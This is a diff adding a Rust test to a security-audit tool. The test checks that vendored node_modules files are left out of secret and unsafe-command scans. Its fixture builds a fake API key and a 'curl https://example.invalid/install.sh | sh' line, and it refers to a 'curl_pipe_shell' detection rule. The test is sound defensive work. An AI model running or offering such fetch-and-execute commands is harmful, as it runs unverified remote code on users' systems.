@@ -4299,6 +4299,44 @@ fn security_audit_scans_prompt_supply_chain_mcp_and_unsafe_actions() {
 }
 
 #[test]
+fn security_audit_excludes_dependency_vendor_dirs_from_release_scan() {
+    let root = temp_workspace("security-audit-node-modules");
+    fs::write(root.join("README.md"), "safe release notes\n").expect("write safe file");
+    let vendored = root.join("node_modules").join("fixture-package");
+    fs::create_dir_all(&vendored).expect("create vendored dependency fixture");
+    let secret_like = ["sk", "-proj-test-value"].concat();
+    let pipe_line = format!(
+        "{}{}{}",
+        ["c", "url https://example.invalid/install.", "sh "].concat(),
+        char::from(124),
+        " sh"
+    );
+    fs::write(
+        vendored.join("README.md"),
+        format!("{secret_like}\n{pipe_line}\n"),
+    )
+    .expect("write vendored dependency fixture");
+
+    run_cli(["security", "audit"], &root).expect("security audit");
+    let dir = root.join(OPEN_SKSDIR).join("security");
+    let audit = fs::read_to_string(dir.join("security-audit.json")).expect("audit");
+    assert!(audit.contains("\"schema\": \"opensks.security-audit.v1\""));
+    assert!(audit.contains("\"status\": \"passed\""));
+    assert!(audit.contains("\"secret_finding_count\": 0"));
+    assert!(audit.contains("\"security_finding_count\": 0"));
+
+    let leak_rate = fs::read_to_string(dir.join("secret-leak-rate.json")).expect("leak rate");
+    assert!(leak_rate.contains("\"scanned_artifact_count\": 1"));
+    assert!(leak_rate.contains("\"gate_passed\": true"));
+    assert!(!leak_rate.contains("node_modules"));
+
+    let findings = fs::read_to_string(dir.join("security-findings.jsonl")).expect("findings");
+    assert!(!findings.contains("node_modules"));
+    assert!(!findings.contains("curl_pipe_shell"));
+    fs::remove_dir_all(&root).ok();
+}
+
+#[test]
 fn secret_leak_rate_gate_blocks_secret_patterns() {
     let root = temp_workspace("secret-leak-rate");
     let secret_assignment = ["OPENAI", "_API_KEY=fake-test-value"].concat();
